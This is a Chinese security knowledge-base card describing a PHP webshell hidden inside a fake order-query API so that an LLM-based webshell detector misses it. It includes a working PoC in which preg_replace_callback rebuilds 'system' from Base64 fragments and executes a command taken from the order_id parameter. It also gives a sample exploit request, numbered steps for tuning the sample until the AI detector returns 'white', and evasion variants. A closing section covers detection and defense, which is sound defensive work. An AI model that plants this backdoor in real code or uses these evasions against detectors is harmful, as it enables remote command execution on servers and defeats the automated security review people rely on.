---
id: ai-security-prompt-injection-webshell-business-param-regex-callback
title: 业务参数藏 WebShell：order_id 承载 base64 命令，preg_replace_callback 重组 system 绕过 AI 检测
type: scenario
domain: ai-security
path: ai-security/prompt-injection
technique: webshell-business-param-regex-callback
aliases:
- 业务逻辑契合后门
- order_id 传参 WebShell
- preg_replace_callback 重组后门
- base64 片段拆分 system
- AI WebShell 检测业务伪装
tags:
- ai-security
- prompt-injection
- detection-bypass
- webshell
- php
- llm
- code-review
- evasion
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V163
  verified_at: '2026-11-06T13:35:16+08:00'
  notes: 已对照原文与 8 张图核对：order_id→text→preg_replace_callback→base64→system 链路、$command===$_GET['x'] 二次校验与请求回显一致；修正 white 证据描述——原文图 06 white 样本哈希与图 03 登录业务样本相同（4d62b059…），white 结论独立性存疑，未在本机复现
---

## 一句话结论

把 WebShell 伪装成“订单查询接口的日志/调试文本处理”：正常业务接口接收 `order_id` 等合法参数并返回 JSON，文件末尾追加一段 `preg_replace_callback`，从形如 `The data is: [c3lz] and [dGVt] then execute [$order_id]` 的文本里依次 Base64 解码出 `sys`、`tem` 和命令，拼成 `system` 后执行；恶意代码在 `echo json_encode(...)` 之后运行，命令有输出时追加在正常 JSON 尾部，无输出时响应完全正常，AI 检测器容易把它当成正常业务逻辑而判 white。

## 原理

- **业务上下文降低恶意先验**：检测器先看到完整的订单增删查业务、参数校验和 JSON 响应，容易形成“这是正常订单接口”的判断；后门追加在业务代码之后，且没有显式 `$_GET['cmd']` 这类敏感入口。
- **合法参数即命令通道**：`order_id` 是业务字段，攻击者传入 Base64 后的命令（如 `d2hvYW1p` = `whoami`）；代码里不出现 `system($_GET[...])` 的直接数据流，命令来自“日志文本”中的占位符。
- **文本模板 + 正则回调伪装**：`preg_replace_callback('/\[([a-zA-Z0-9\/+=]+)\]/', ...)` 看起来像在做日志占位符替换/格式化；回调里 `base64_decode` 后按计数把前两段当函数名片段、第三段当命令，`implode` 得到 `system`。
- **危险词拆分**：`c3lz`、`dGVt` 单独看是普通 Base64 字符串，只有运行时拼接才出现 `system`，静态关键字检测与 LLM 的“危险函数”模式都不易直接命中；`function_exists`/字符串比较也可进一步包装。
- **执行点后置 + 输出混合**：`echo json_encode($response)` 先把正常响应写出去，随后才执行后门；命令无输出时用户只看到正常 JSON，命令有输出时追加在 JSON 之后，攻击者可通过响应尾部判断执行结果。
- **为什么能绕过 AI**：LLM 检测器按语义模式近似执行，缺少 AST/污点分析；它看到的是“订单业务 + 正则替换日志文本”，难以把 `order_id` → `$text` → 正则捕获 → `base64_decode` → `implode` → `system` 的完整链路串起来。

## 触发条件

- AI 检测/代码审计把完整 PHP 源码交给 LLM 判定，且直接采信 white/black，没有确定性引擎复核或反混淆。
- 攻击者能把 PHP 文件落地到目标（上传、写入、包含等），且 `system` 等函数未被 `disable_functions` 禁用。
- 业务接口存在一个可被外部控制、且会进入后门“日志文本”的普通参数（如 `order_id`、`username`、`title`、搜索词）。
- 后门文件可以追加在正常业务代码之后，且输出缓冲/响应已发送后仍能继续执行。
- 目标检测模型存在“业务上下文优先、动态拼接失明”的弱点；原文为比赛环境，具体模型/版本未披露。

## 利用步骤

1. 准备一个正常的订单查询接口：接收 `action`、`order_id`、`customer_name`、`total_amount`，执行业务分支并 `echo json_encode($response)`。
2. 在文件末尾追加日志文本：`$text = "The data is: [c3lz] and [dGVt] then execute [$order_id]";`，其中 `c3lz`/`dGVt` 是 `sys`/`tem` 的 Base64。
3. 用 `preg_replace_callback` 匹配方括号内容：回调内 `base64_decode`，前两次命中存入 `$funcParts`，第三次存入 `$command`；`implode('', $funcParts)` 得到 `system`。
4. 追加执行条件：`if ($func === 'system' && $command === $_GET['x']) { system($command); }`（原文用 `$_GET[x]` 做二次校验；也可直接执行 `$command`）。
5. 上传文件，向检测平台提交，观察是否判 white；若 black，调整业务叙事、拆分方式或执行条件。
6. 请求 `?x=<命令>&order_id=<base64 命令>`，例如 `?x=whoami&order_id=d2hvYW1p`；命令输出会追加在 JSON 响应之后（原文截图为 404 JSON 后跟乱码命令回显）。
7. 变体：把命令放在 `username`/`title`/`search` 等更自然的字段；把 Base64 片段写进多行日志、数组或配置；用 `preg_replace`/`preg_match_all`/迭代器重组；把执行点放到 `register_shutdown_function` 或响应结束之后。

## PoC

最小化结构示意（未在原文环境复测；仅防御研究）：

```php
<?php
header('Content-Type: application/json; charset=utf-8');

$action   = $_GET['action'] ?? 'query';
$order_id = $_GET['order_id'] ?? '';

// 正常订单业务（省略分支细节）
$response = ['code' => 404, 'message' => '订单不存在（模拟环境无数据）'];
echo json_encode($response, JSON_UNESCAPED_UNICODE);

// 追加的“日志处理”后门
$text = "The data is: [c3lz] and [dGVt] then execute [$order_id]";
$funcParts = [];
$command = '';

preg_replace_callback('/\[([a-zA-Z0-9\/+=]+)\]/', function ($m) use (&$funcParts, &$command) {
    static $count = 0;
    $decoded = base64_decode($m[1]);
    if ($count < 2) {
        $funcParts[] = $decoded;
    } else {
        $command = $decoded;
    }
    $count++;
    return '';
}, $text);

$func = implode('', $funcParts);
if ($func === 'system' && $command === ($_GET['x'] ?? '')) {
    system($command);
}
```

请求：

```http
GET /1.php?x=whoami&order_id=d2hvYW1p HTTP/1.1
Host: 127.0.0.1
```

响应：正常 JSON（如 `{"code":404,...}`）后追加 `whoami` 的输出（图 05 可见 JSON 结束后仍有额外字节）。原文声称最终样本 1.php 在检测平台为 white；但核对该 white 截图（图 06）的样本哈希与作者先前的登录业务样本（图 03）完全相同（4d62b059…），white 结论的独立性存疑，引用时需以实际检测环境复测为准。

## 变体与关联

- **参数载体变体**：`order_id`、`username`、`title`、`email`、搜索关键字、分页参数；凡是会进入日志/文本拼接的业务字段都可尝试。
- **重组方式变体**：`preg_replace_callback`、`preg_match_all` + 循环、`LimitIterator`/`ArrayIterator` 分页重组、`json_decode` 后按 id 排序拼接；核心是让危险函数名/命令在运行时才出现。
- **执行时机变体**：业务响应之后、`register_shutdown_function`、析构函数、错误处理器；利用“响应已发出”降低用户与检测器对后续输出的注意。
- **关联**：[[ai-security-prompt-injection-ai-webshell-detector-structural-blindspots]]（同类结构盲区总卡：强比较、作用域、业务后置、JSON 数据化、chr 调试分支）、[[ai-security-prompt-injection-ai-webshell-detector-comment-bypass]]（注释注入/语境稀释）、[[web-php-rce-iterator-webshell-split-reassemble]]（SPL 迭代器拆分函数名/命令）。
- **边界**：原文只测试比赛环境中的特定 AI 模型，未给出模型名称/版本；若检测器做 AST/污点分析、反混淆 Base64、监控 `preg_replace_callback` + 动态函数调用，或 `system` 被禁用，利用失败。命令无输出时只能确认“未被检测”，不能确认执行；本卡 confidence 标 medium。

## 检测与防御

- **不要只用 LLM 判定**：AI 结论必须由 AST/污点分析/符号执行/沙箱复核；重点规则：`preg_replace_callback`/`preg_match_all` 回调内 `base64_decode` 后拼接、用户参数进入文本模板再被回调取出、`implode` 后接 `function_exists`/可变函数/`system`。
- **数据流追踪**：把 `$_GET/$_POST` 到 `$text` 到正则捕获到 `base64_decode` 到 `$func($command)` 的链路标为高危；不要因为中间经过“日志文本”就认为不可控。
- **规范化与反混淆**：检测前还原 Base64、字符串拼接、数组/迭代器重组；对业务代码后的追加段单独做深度分析，而不是只看业务主体。
- **运行时防护**：`disable_functions` 禁用 `system/exec/shell_exec` 等；限制上传目录执行权限；监控 Web 进程派生 shell、异常响应尾部输出、文件变更。
- **检测器评估**：用“正常业务 + 后置日志处理 + Base64 片段 + 合法参数传命令”的样本做对抗测试；对 white 结论保留人工复核。
